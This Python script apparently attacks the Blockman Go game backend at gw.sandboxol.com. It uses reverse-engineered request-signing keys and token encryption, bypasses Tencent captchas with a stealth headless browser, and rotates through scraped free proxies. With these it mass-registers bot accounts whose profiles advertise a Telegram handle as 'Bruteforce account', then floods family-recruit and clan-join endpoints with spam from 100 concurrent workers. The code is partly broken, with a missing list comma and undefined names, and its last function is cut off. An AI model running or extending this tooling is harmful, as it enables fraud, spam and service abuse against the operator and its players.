import asyncio
import base64
import hashlib
import random
import uuid
import time
import re
import os
import json
from urllib.parse import urlparse, parse_qs, unquote
import subprocess

import aiohttp
try:
    import uvloop
    uvloop.install()
except ImportError:
    pass
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
import subprocess
from aiohttp_socks import ProxyType, ProxyConnector
from PyRoxy import ProxyChecker, ProxyUtiles
from playwright.async_api import async_playwright, TimeoutError
from playwright_stealth import Stealth

class CaptchaError(Exception):
    pass

PROXY_WORK = []
WORKERS = [
    "https://super-flower-5d48.kolyagrozy.workers.dev/",
    "https://orange-queen-66f1.kolyagrozy.workers.dev/",
    "https://fragrant-lake-e1b5.kolyagrozy.workers.dev/",
    "https://lively-sky-e832.kolyagrozy.workers.dev/",
    "https://old-shape-83cc.kolyagrozy.workers.dev/",
    "https://aged-shadow-7152.kolyagrozy.workers.dev/",
    "https://yellow-hill-44c0.kolyagrozy.workers.dev/",
    "https://raspy-rice-d1bf.kolyagrozy.workers.dev/",
    "https://soft-bird-d002.kolyagrozy.workers.dev/",
    "https://holy-tree-3299.kolyagrozy.workers.dev/"
    "https://muddy-glitter-8f0e.kolyagrozy.workers.dev/",
    "https://round-base-300d.kolyagrozy.workers.dev/",
    "https://polished-leaf-af96.kolyagrozy.workers.dev/",
    "https://weathered-cloud-61d3.kolyagrozy.workers.dev/",
    "https://sparkling-dust-ac4e.kolyagrozy.workers.dev/"
]

def get_xsign(path, nonce, time, params, android_id):
    md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()

    if path in ENDPOINTS or (path.startswith("/config/files/") or path.startswith("/config/ml/files/")):
        return md5
    return hashlib.md5(f"{md5}{android_id}".encode()).hexdigest()

def get_enc_token(no_enc_token):
    data = pad(bytes(b ^ 0x73 for b in no_enc_token.encode()), 16)

    secret = hashlib.md5(b"9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s").hexdigest()

    cipher = AES.new(secret[:16].encode(), AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data)).decode()

def get_enc_query(android_id, nonce):
    key = RSA.import_key(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLzlsA+3wXCAph80r/xs1bWhVrsJSOQmSBTA0GaBpVIzXqFBaibDmYA3WJDM9rcQ7KpYSyrJ02iFlsN43RnizrHfS+xPtdwuxBQ2Clow5cYPZucqQYL9HIlbBLoighH2eGQqGlVadL7r384iKTz9mmckSUa8hhJzS+WwUAqVO3DwIDAQAB"))
    cipher = PKCS1_v1_5.new(key)
    query = f"0\n{android_id}\n{nonce}".encode()
    encrypted = b""
    for i in range(0, len(query), 117):
        chunk = query[i:i+117]
        encrypted += cipher.encrypt(chunk)
    return base64.b64encode(encrypted).decode()

def get_android_sign(android_id):
    xored_data = bytes(b ^ 0x73 for b in android_id.encode())
    padded_data = pad(xored_data, AES.block_size)

    cipher = AES.new(b"MFwwDQYJKoZIhvcN", AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(padded_data)

    return base64.b64encode(encrypted_bytes).decode()

DATA_CENTERS = []

async def cdn(session):
    async with session.get("https://pastebin.com/raw/JAUiZzvb") as response:
        ips_text = await response.text()

    ips = [ip.strip() for ip in ips_text.split(",") if ip.strip()]

    async def add_cdn(ip):
        async with session.get(f"https://dns.google/resolve?name=gw.sandboxol.com&type=A&edns_client_subnet={ip}") as response:
            payload = await response.json()
            return [
                answer["data"] for answer in payload.get("Answer", [])
                if answer.get("type") == 1 and "data" in answer
            ]

    while True:
        tasks = (add_cdn(ip) for ip in ips)
        results = await asyncio.gather(*tasks)

        unique_ips = {ip for sublist in results for ip in sublist}

        DATA_CENTERS[:] = sorted(list(unique_ips))
        print(f"DATA_CENTERS updated: {DATA_CENTERS}")

        await asyncio.sleep(6000000000000000000000)

SOCKS = []

async def proxies(session):
    while True:
        global PROXY_WORK

        prx = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/refs/heads/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/elliottophellia/proxylist/refs/heads/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt",
           # "https://raw.githubusercontent.com/zenjahid/FreeProxy4u/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/databay-labs/free-proxy-list/refs/heads/master/socks5.txt",
            "https://raw.githubusercontent.com/Skillter/ProxyGather/refs/heads/master/proxies/working-proxies-socks5.txt",
            #"https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/socks5.txt",
            "https://raw.githubusercontent.com/zebbern/Proxy-Scraper/refs/heads/main/socks5.txt"
        ]

        send = 0
        total = 0
        naxui = random.randint(1000, 9999)
        for url in prx:
            send += 1
            try:
                async with session.get(url, timeout=5) as response:
                    req = await response.text()
                req = re.sub(r"^\s+|\s+$", "", re.sub(r"^\s*$\n?", "", req, flags=re.MULTILINE), flags=re.MULTILINE).splitlines()

                if "socks5" in url:
                    req = ["socks5://" + prox.lstrip("socks5://") for prox in req]

                elif "socks4" in url:
                    req = ["socks4://" + prox.lstrip("socks4://") for prox in req]

                elif "https" in url:
                    req = ["https://" + prox.lstrip("https://") for prox in req]

                elif "http" in url:
                    req = ["http://" + prox.lstrip("http://") for prox in req]

                total += len(req)
                print(f"[{send}]", url, f"| {len(req)}")

                with open(f"bazadian{naxui}.txt", "a", encoding="utf-8") as f:
                    f.write("\n".join([re.sub(r"^(([^:]+:){2}[^:]+):.*$", r"\1", prox) for prox in req]) + "\n")
            except Exception as e:
                print(e)

        print(f"total {total}\n")

        proxies_list = ProxyUtiles.readFromFile(f"bazadian{naxui}.txt")

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, ProxyChecker.checkAll, proxies_list
        )
        print("all proxy checked")

        SOCKS = [str(proxy) for proxy in result]

        print(f"Found {len(SOCKS)} working proxies.")
        await asyncio.sleep(300)

async def update_endpoints(session):
    global ENDPOINTS

    async with session.get("https://pastebin.com/raw/zYLkEaLv") as response:
        ENDPOINTS = (await response.text()).split(",")

def parse_vless_to_xray_json(vless_link: str) -> str:
    print(vless_link)
    def is_valid_hostname(hostname):
        if not hostname or len(hostname) > 255:
            return False
        if hostname[-1] == ".":
            hostname = hostname[:-1]
        allowed = re.compile(r"(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
        return all(allowed.match(x) for x in hostname.split("."))

    try:
        vless_link = vless_link.strip().replace('&amp;', '&')

        parsed_url = urlparse(vless_link)
        params = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}

        outbound_config = {
            "protocol": "vless",
            "tag": unquote(parsed_url.fragment or "proxy"),
            "settings": {
                "vnext": [
                    {
                        "address": parsed_url.hostname,
                        "port": parsed_url.port,
                        "users": [
                            {
                                "id": parsed_url.username,
                                "encryption": params.get("encryption", "none"),
                                "flow": params.get("flow", "")
                            }
                        ]
                    }
                ]
            },
            "streamSettings": {
                "network": params.get("type", "tcp"),
                "security": params.get("security", "none") if params.get("security") is not None else "none"
            }
        }

        network = outbound_config["streamSettings"]["network"]
        if network == "ws":
            outbound_config["streamSettings"]["wsSettings"] = {
                "path": params.get("path", "/"),
                "headers": {"Host": params.get("host", parsed_url.hostname)}
            }
        elif network == "grpc":
            outbound_config["streamSettings"]["grpcSettings"] = {
                "serviceName": params.get("serviceName", ""),
                "multiMode": True if params.get("mode") == "multi" else False
            }
        elif network == "tcp" and params.get("headerType") == "http":
            outbound_config["streamSettings"]["tcpSettings"] = {
                "header": {
                    "type": "http",
                    "request": {
                        "path": ["/"],
                        "headers": {"Host": [params.get("host", parsed_url.hostname)]}
                    }
                }
            }

        security = outbound_config["streamSettings"]["security"]
        if security in ["tls", "reality"]:
            sni_candidate = params.get("sni")
            host_candidate = params.get("host", parsed_url.hostname)

            final_sni = host_candidate
            if sni_candidate and is_valid_hostname(sni_candidate):
                final_sni = sni_candidate

            if security == "tls":
                tls_settings = {"serverName": final_sni}
                if "fp" in params:
                    tls_settings["fingerprint"] = params["fp"]
                if "alpn" in params:
                    tls_settings["alpn"] = unquote(params["alpn"]).split(',')
                outbound_config["streamSettings"]["tlsSettings"] = tls_settings

            elif security == "reality":
                reality_settings = {"serverName": final_sni}
                if "pbk" in params:
                    reality_settings["publicKey"] = params["pbk"]
                if "fp" in params:
                    reality_settings["fingerprint"] = params["fp"]
                if "sid" in params:
                    reality_settings["shortId"] = params["sid"]
                outbound_config["streamSettings"]["realitySettings"] = reality_settings

        local_port = random.randint(10000, 20000)

        full_config = {
            "inbounds": [
                {
                    "listen": "127.0.0.1",
                    "port": local_port,
                    "protocol": "socks",
                    "settings": {
                        "auth": "noauth",
                        "udp": True
                    },
                    "tag": "socks-in"
                }
            ],
            "outbounds": [
                outbound_config,
                {"protocol": "freedom", "tag": "direct"},
                {"protocol": "blackhole", "tag": "block"}
            ]
        }

        return json.dumps(full_config, indent=2)

    except Exception as e:
        print(f"Error parsing link '{vless_link}': {e}")
        return "{}"

VLESS = []

async def vless(session):
    async with session.get("https://raw.githubusercontent.com/ebrasha/free-v2ray-public-list/refs/heads/main/vless_configs.txt") as response:
        result = (await response.text()).strip().split("\n")[-2500:]

    result = [f"{match.group(1)}:{match.group(2)}:{''.join(line.split())}" for line in result if (match := __import__('re').search(r'vless://(?:.*@)?((?:(?:\d{1,3}\.){3}\d{1,3})|\[[^\]]+\]):(\d+)', line.strip()))]

    hosts_to_ping = [server.split(":")[0] for server in result if server]

    multiping_results = await icmplib.async_multiping(hosts_to_ping, count=1, timeout=1, concurrent_tasks=2500, privileged=False)

    VLESS_PING = []

    for host in multiping_results:
        if host.is_alive:
            print(host.address)
            VLESS_PING.append(next(s.split(":", 2)[2] for s in result if s.startswith(host.address + ":")))

    print(parse_vless_to_xray_json(random.choice(VLESS_PING)))

def proxy_parser(links):
    outbound_configs = []
    for link in links:
        link = link.strip()
        if not link:
            continue

        try:
            outbound_config = None
            remark = ""

            if link.startswith("vmess://"):
                try:
                    # vmess использует Base64 для всей конфигурации
                    padding = len(link[8:]) % 4
                    encoded_config = link[8:] + "=" * padding
                    decoded_config_str = base64.b64decode(encoded_config).decode('utf-8')
                    outbound_config = json.loads(decoded_config_str)
                except (json.JSONDecodeError, base64.binascii.Error):
                    # Пропускаем некорректно закодированные vmess ссылки
                    continue

            else:
                # Обработка других протоколов через парсинг URL
                try:
                    parsed_url = urlparse(link)
                except ValueError:
                    continue # Пропускаем полностью невалидные URL

                protocol = parsed_url.scheme
                
                if parsed_url.fragment:
                    remark = unquote(parsed_url.fragment)

                if protocol not in ["vless", "ss", "trojan"]:
                    continue

                outbound_config = {
                    "protocol": protocol,
                    "settings": {},
                    "streamSettings": {},
                    "tag": remark,
                    "remark": remark
                }
                
                query_params = parse_qs(parsed_url.query)

                # Настройки протокола
                if protocol == "vless":
                    outbound_config["settings"]["vnext"] = [{
                        "address": parsed_url.hostname,
                        "port": parsed_url.port,
                        "users": [{
                            "id": parsed_url.username, 
                            "encryption": query_params.get("encryption", ["none"])[0], 
                            "flow": query_params.get("flow", [""])[0]
                        }]
                    }]
                
                elif protocol == "ss":
                    try:
                        # Shadowsocks хранит method:password в base64
                        user_info = parsed_url.username
                        padding = len(user_info) % 4
                        user_info += "=" * padding
                        decoded_userinfo = base64.urlsafe_b64decode(user_info).decode('utf-8')
                        method, password = decoded_userinfo.split(':', 1)
                    except Exception:
                        continue # Пропускаем, если данные ss некорректны
                    
                    outbound_config["protocol"] = "shadowsocks" # В Xray протокол называется shadowsocks
                    outbound_config["settings"]["servers"] = [{
                        "address": parsed_url.hostname,
                        "port": parsed_url.port,
                        "method": method,
                        "password": password
                    }]

                elif protocol == "trojan":
                    outbound_config["settings"]["servers"] = [{
                        "address": parsed_url.hostname,
                        "port": parsed_url.port,
                        "password": parsed_url.username
                    }]

                # Настройки транспорта (streamSettings)
                network = query_params.get("type", ["tcp"])[0]
                security = query_params.get("security", ["none"])[0]
                
                stream_settings = {"network": network, "security": security}

                if network == "ws":
                    stream_settings["wsSettings"] = {
                        "path": parsed_url.path,
                        "headers": {"Host": query_params.get("host", [""])[0]}
                    }
                
                elif network == "grpc":
                    stream_settings["grpcSettings"] = {
                        "serviceName": unquote(query_params.get("serviceName", [""])[0])
                    }
                
                if security == "tls":
                    sni = query_params.get("sni", query_params.get("host", [""]))[0]
                    stream_settings["tlsSettings"] = {
                        "serverName": sni,
                        "allowInsecure": "1" in query_params.get("allowInsecure", ["0"]),
                        "fingerprint": query_params.get("fp", [""])[0]
                    }

                elif security == "reality":
                    sni = query_params.get("sni", [""])[0]
                    stream_settings["realitySettings"] = {
                        "serverName": sni,
                        "publicKey": query_params.get("pbk", [""])[0],
                        "shortId": query_params.get("sid", [""])[0],
                        "fingerprint": query_params.get("fp", ["chrome"])[0]
                    }
                
                outbound_config["streamSettings"] = stream_settings

            if outbound_config:
                outbound_configs.append(outbound_config)
        
        except Exception:
            # Игнорируем любую ошибку при парсинге отдельной ссылки
            continue
            
    return outbound_configs

async def proxy_updater(session):
    global PROXY_WORK

    async with session.get("https://raw.githubusercontent.com/Epodonios/v2ray-configs/refs/heads/main/All_Configs_Sub.txt") as response:
        links = (await response.text()).splitlines()
        with open("proxy.txt", "w") as f:
            for config in proxy_parser(links):
                f.write(json.dumps(config) + "\n")
        subprocess.run('port=1024; while read -r proxy; do echo "{\"inbounds\":[{\"port\":$port,\"protocol\":\"socks\",\"settings\":{\"auth\":\"noauth\",\"udp\":true,\"ip\":\"127.0.0.1\"}}],\"outbounds\":[$proxy]}" | xray -config stdin: >/dev/null 2>&1 & echo "Запущен SOCKS5 прокси на 127.0.0.1:$port"; ((port++)); done < proxy.txt', shell=True, executable="/bin/bash")
        with open("ports.txt", "w") as f:
            for port in range(1024, 65535 + 1):
                f.write(f"socks5://127.0.0.1:{port}\n")
        proxies = ProxyUtiles.readFromFile("ports.txt")
        result = ProxyChecker.checkAll(proxies, threads=1000)
        for proxy in result:
            PROXY_WORK.append(f"{proxy.type.name.lower()}://{proxy.host}:{proxy.port}")
            print(f"{proxy.type.name.lower()}://{proxy.host}:{proxy.port}")

async def main():
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=0)
    ) as session:
      #  await proxy_updater(session)
        asyncio.create_task(update_endpoints(session))
        asyncio.create_task(cdn(session))
        while True:
            if not DATA_CENTERS:
                await asyncio.sleep(0.01)
                continue
            break
        lock = asyncio.Lock()
        asyncio.create_task(create_accounts(session, lock))
        #await asyncio.sleep(15)
        #asyncio.create_task(flood_s(session, lock))
        await asyncio.sleep(9999999999999999999999999999999999999999)

ACCOUNTS = []
ABUSE = {}

async def get_available_proxy(lock):
    async with lock:
        shuffled_proxies = random.sample(PROXY_WORK, len(PROXY_WORK))
        for prx in shuffled_proxies:
            count, last_used = ABUSE.get(prx, (0, 0))
            if count >= 5 and (time.time() - last_used) >= 300:
                print(f"Счётчик для прокси {prx} сброшен. Время остыть прошло.")
                ABUSE[prx] = (0, 0)
                count, last_used = 0, 0
            if count < 5:
                ABUSE[prx] = (count + 1, time.time())
                print(f"Прокси {prx} зарезервирован. Счётчик: {count + 1}")
                return prx
        return None

async def captcha():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"></head>
    <body>
        <div id="captcha-container"></div>
        <p id="result"></p>
        <script src="https://ca.turing.captcha.qcloud.com/TSDKCaptcha-global.js"></script>
        <script>
            const container = document.getElementById('captcha-container');
            const resultContainer = document.getElementById('result');
            const appId = '189951227';
            const callback = (response) => {
                if (response.ret === 0) {
                    resultContainer.textContent = response.ticket + ':' + response.randstr;
                } else {
                    resultContainer.textContent = 'Error';
                }
            };
            try {
                new TencentCaptcha(container, appId, callback, {}).show();
            } catch (e) {
                resultContainer.textContent = 'Init Error';
            }
        </script>
    </body>
    </html>
    """
    
    async with Stealth().use_async(async_playwright()) as p:
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        page = await browser.new_page()
        
        try:
            await page.set_content(html_content, wait_until="domcontentloaded")
            result_selector = '#result:has-text(":")'
            await page.wait_for_selector(result_selector, timeout=8000)
            
            combined_result = await page.inner_text('#result')
            
            await browser.close()
            return combined_result.strip()
        except TimeoutError:
            await browser.close()
            print("Timeout: Не удалось получить ticket:randstr за 8 секунд.")
        except Exception as e:
            await browser.close()
            print(f"Непредвиденная ошибка: {e}")

async def cr(session, lock):
    global ABUSE
    while True:
       # async with aiohttp.ClientSession(connector=ProxyConnector.from_url(prx, ssl=False, limit=0)) as session:
        if "pr" == "pr":
            android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
            nonce = str(uuid.uuid4())
            query = get_enc_query(android_id, nonce)
            android_sign = get_android_sign(android_id)
            xtime = str(int(time.time()))
            ticket, randstr = (await captcha()).split(":")
            xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}&ticket={ticket}&randomstr={randstr}", android_id)
            try:
                async with session.get(
                    f"http://{random.choice(DATA_CENTERS)}/user/api/v5/account/auth-token",
                    timeout=5,
                    params={"q":query,"ticket":ticket,"randomstr":randstr},
                    headers={
                        "bmg-user-id": "0",
                        "bmg-device-id": android_id,
                        "bmg-sign": android_sign,
                        "bmg-adid-sign": "98a580c5182455f00f732f48233928706925543c",
                        "package-name": "com.sandboxol.blockymods",
                        "userId": "0",
                        "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods",
                        "androidVersion": "30",
                        "OS": "android",
                        "appType": "android",
                        "appLanguage": "ru",
                        "appVersion": "5421",
                        "appVersionName": "2.125.1",
                        "channel": "sandbox",
                        "uid_register_ts": "0",
                        "device_register_ts": "0",
                        "eventType": "app",
                        "userDeviceId": android_id,
                        "userLanguage": "ru_RU",
                        "region": "",
                        "clientType": "client",
                        "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                        "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "telecomOper": "unknown",
                        "manufacturer": "Redmi_Redmi Note 8 Pro",
                        "network": "wifi",
                        "brand": "Redmi",
                        "model": "Redmi Note 8 Pro",
                        "device": "begonia",
                        "deviceModel": "Redmi Note 8 Pro",
                        "board": "begonia",
                        "cpu": "CPU architecture: 8",
                        "cpuFrequency": "2012500",
                        "dpi": "2.75",
                        "screenHeight": "2220",
                        "screenWidth": "1080",
                        "ram_memory": "5635",
                        "rom_memory": "52438",
                        "open_id": "",
                        "open_id_type": "0",
                        "client_ip": "",
                        "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce,
                        "X-Time": xtime,
                        "X-Sign": xsign,
                        "X-UrlPath": "/user/api/v5/account/auth-token",
                        "Access-Token": "",
                        "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                        "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    response_text = await response.text()
                    print(response_text)
                    response_json = json.loads(response_text)
                    #await asyncio.sleep(300)
                    if response_json.get("code") == 1:
                        answer = response_json
                        user_id = str(int(answer["data"]["userId"]))
                        token = answer["data"]["accessToken"]
                        register_time = str(int(answer["data"]["registerTime"]))
                        device_register_time = str(int(answer["data"]["deviceRegisterTime"]))
                        nickname = "kn_ew.tg_" + uuid.uuid4().hex[:11]
                        nonce = str(uuid.uuid4())
                        xtime = str(int(time.time()))
                        a = "{"
                        b = "}"
                        body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761508908718930.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                        xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                        async with session.post(
                            f"http://{random.choice(DATA_CENTERS)}/user/api/v1/user/register",
                            timeout=5,
                            data=body_string.encode(),
                            headers={
                                "bmg-device-id": android_id,
                                "userId": user_id,
                                "packageName": "official",
                                "packageNameFull": "com.sandboxol.blockymods",
                                "androidVersion": "30",
                                "OS": "android",
                                "appType": "android",
                                "appLanguage": "ru",
                                "appVersion": "5421",
                                "appVersionName": "2.125.1",
                                "channel": "sandbox",
                                "uid_register_ts": register_time,
                                "device_register_ts": device_register_time,
                                "eventType": "app",
                                "userDeviceId": android_id,
                                "userLanguage": "ru_RU",
                                "region": "RU",
                                "clientType": "client",
                                "env": "prd",
                                "package_name_en": "com.sandboxol.blockymods",
                                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
                                "adid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "telecomOper": "unknown",
                                "manufacturer": "Redmi_Redmi Note 8 Pro",
                                "network": "wifi",
                                "brand": "Redmi",
                                "model": "Redmi Note 8 Pro",
                                "device": "begonia",
                                "deviceModel": "Redmi Note 8 Pro",
                                "board": "begonia",
                                "cpu": "CPU architecture: 8",
                                "cpuFrequency": "2012500",
                                "dpi": "2.75",
                                "screenHeight": "2220",
                                "screenWidth": "1080",
                                "ram_memory": "5635",
                                "rom_memory": "52438",
                                "open_id": "",
                                "open_id_type": "0",
                                "client_ip": "",
                                "apps_flyer_gaid": "6b4f9c25-c0fe-413c-8122-d8ddfb50b5ac",
                                "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                                "X-Nonce": nonce,
                                "X-Time": xtime,
                                "X-Sign": xsign,
                                "X-UrlPath": "/user/api/v1/user/register",
                                "Access-Token": get_enc_token(token + nonce),
                                "Content-Type": "application/json; charset=UTF-8",
                                "Host": "gw.sandboxol.com",
                                "Connection": "Keep-Alive",
                                "Accept-Encoding": "gzip",
                                "User-Agent": "okhttp/4.10.0"
                            }
                        ) as response:
                            post_response_json = await response.json()
                            if post_response_json.get("code") == 1:
                                answer = post_response_json
                                token = answer["data"]["accessToken"]
                                register_time = str(int(answer["data"]["registerTime"]))
                                async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
            except Exception as e:
                print(e)

async def create_accounts(session, lock):
    tasks = [asyncio.create_task(cr(session, lock)) for _ in range(1)]
    await asyncio.gather(*tasks)

async def flood_s(session, lock):
    async def flood_k():
        while True:
            if not ACCOUNTS:
                await asyncio.sleep(0.1)
                continue
            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
                account = random.choice(ACCOUNTS)
                user_id, token, android_id, register_time, device_register_time = account.split(":")
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
                region = random.choice(
                    [
                        "zh_CN", "en_US", "de_DE", "es_ES", "fr_FR", "hi_IN", "in_ID",
                        "it_IT", "ja_JP", "ko_KR", "pl_PL", "pt_PT", "ru_RU", "th_TH",
                        "tr_TR", "uk_UA", "vi_VN"
                    ]
                )
                try:
                    async with session.delete(
                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        timeout=5,
                        headers={
                            "userId": user_id, "packageName": "official", "packageNameFull": "com.sandboxol.blockymods",
                            "androidVersion": "30", "OS": "android", "appType": "android", "appLanguage": region[:2],
                            "appVersion": "5421", "appVersionName": "2.125.1", "channel": "sandbox",
                            "uid_register_ts": register_time, "device_register_ts": device_register_time, "eventType": "app",
                            "userDeviceId": android_id, "userLanguage": region, "region": "RU", "clientType": "client",
                            "env": "prd", "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de", "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce, "X-Time": xtime, "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce), "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass

                    nonce = str(uuid.uuid4())
                    xtime = str(int(time.time()))
                    a = "{"
                    b = "}"
                    aa = random.choice(["1", "2", "3", "4"])
                    bb = random.choice(["1", "2", "3", "4"])
                    body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
                    xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
                    async with session.post(
                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                        data=body_string.encode(),
                        timeout=5,
                        headers={
                            "language": region, "userId": user_id, "packageName": "official",
                            "packageNameFull": "com.sandboxol.blockymods", "androidVersion": "30",
                            "OS": "android", "appType": "android", "appLanguage": region[:2],
                            "appVersion": "5421", "appVersionName": "2.125.1", "channel": "sandbox",
                            "uid_register_ts": register_time, "device_register_ts": device_register_time,
                            "eventType": "app", "userDeviceId": android_id, "userLanguage": region,
                            "region": "RU", "clientType": "client", "env": "prd",
                            "package_name_en": "com.sandboxol.blockymods",
                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de", "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                            "X-Nonce": nonce, "X-Time": xtime, "X-Sign": xsign,
                            "X-UrlPath": "/friend/api/v1/family/recruit",
                            "Access-Token": get_enc_token(token + nonce),
                            "Content-Type": "application/json; charset=UTF-8", "Host": "gw.sandboxol.com",
                            "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.10.0"
                        }
                    ) as response:
                        pass
                except Exception as e:
                    print(e)

    tasks = [asyncio.create_task(flood_k()) for _ in range(100)]
    await asyncio.gather(*tasks)

async def clan_flood(session, clan_id, region):
    nonce = str(uuid.uuid4())
    xtime = str(int(time.time()))
    account = random.choice(ACCOUNTS)
    user_id, token, android_id, register_time, device_register_time = account.split(":")
    body_string = f'{{"clanId":{clan_id},"msg":"httрs://t.mе/kn_ew (in telegram @kn_ew)"}}'
    xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, body_string, android_id)
    try:
        async with session.post(
            f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
            timeout=2,
            data=body_string,
            headers={
                "language": region, "userId": user_id, "packageName": "official",
                "packageNameFull": "com.sandboxol.blockymods", "androidVersion": "30", "OS": "android",
                "appType": "android", "appLanguage": region[:2], "appVersion": "5421",
                "appVersionName": "2.125.1", "channel": "sandbox", "uid_register_ts": register_time,
                "device_register_ts": device_register_time, "eventType": "app", "userDeviceId": android_id,
                "userLanguage": region, "region": "RU", "clientType": "client", "env": "prd",
                "package_name_en": "com.sandboxol.blockymods",
                "md5": "c0c2f5baf2e9b4a063fc0cdf099960de", "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                "X-Nonce": nonce, "X-Time": xtime, "X-Sign": xsign,
                "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                "Access-Token": get_enc_token(token + nonce), "Content-Type": "application/json; charset=UTF-8",
                "Host": "gw.sandboxol.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            }
        ) as response:
            print(await response.json())
            if (await response.json())[code] == 1:
                nonce = str(uuid.uuid4())
                xtime = str(int(time.time()))
                xsign = get_xsign("/clan/api/v1/clan/tribe/member", nonce, xtime, "", android_id)
                async with session.get(
                    f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/member",
                    timeout=2,
                    headers={
                        "language": region, "userId": user_id, "packageName": "official",
                        "packageNameFull": "com.sandboxol.blockymods", "androidVersion": "30",
                        "OS": "android", "appType": "android", "appLanguage": region[:2],
                        "appVersion": "5421", "appVersionName": "2.125.1", "channel": "sandbox",
                        "uid_register_ts": register_time, "device_register_ts": device_register_time,
                        "eventType": "app", "userDeviceId": android_id, "userLanguage": region,
                        "region": "RU", "clientType": "client", "env": "prd",
                        "package_name_en": "com.sandboxol.blockymods",
                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de", "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                        "X-Nonce": nonce, "X-Time": xtime, "X-Sign": xsign,
                        "X-UrlPath": "/clan/api/v1/clan/tribe/member",
                        "Access-Token": get_enc_token(token + nonce), "Host": "gw.sandboxol.com",
                        "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.10.0"
                    }
                ) as response:
                    print(await response.json())
    except Exception as e:
        print(e)
        return

async def clan_parsing(session):
    while True:
        if not ACCOUNTS:
            await asyncio.sleep(1)
            continue
        nonce = str(uuid.uuid4())
        xtime = str(int(time.time()))
        account = random.choice(ACCOUNTS)
        user_id, token, android_id, register_time, device_register_time = account.split(":")
        xsign = get_xsign("/clan/api/v1/clan/tribe/recommendation", nonce, xtime, "", android_id)
        region = random.choice(
            [
                "zh_CN", "en_US", "de_DE", "es_ES", "fr_FR", "hi_IN", "in_ID",
                "it_IT", "ja_JP", "ko_KR", "pl_PL", "pt_PT", "ru_RU", "th_TH",
